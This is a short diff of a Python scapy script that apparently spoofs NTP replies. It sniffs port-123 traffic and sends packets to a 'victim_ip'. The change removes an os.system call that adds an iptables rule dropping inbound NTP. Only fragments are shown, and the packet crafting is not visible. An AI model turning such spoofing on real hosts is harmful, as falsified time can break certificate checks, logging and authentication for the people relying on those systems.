@@ -1,7 +1,7 @@
 from scapy.all import IP, UDP, NTP, send, sniff, Ether
 from scapy.layers.ntp import NTP
 import time, datetime
-import os
+#import os
 
 
 server_ip = "10.10.10.12"
@@ -40,7 +40,5 @@ def ntp_request(packet):
         send_ntp(victim_ip, packet)
 
 if __name__ == "__main__":
-    iptables_rule = "iptables -A INPUT -p udp --dport 123 -j DROP"
-    os.system(iptables_rule)
     print('here')
     sniff(filter="udp and port 123", prn=ntp_request)
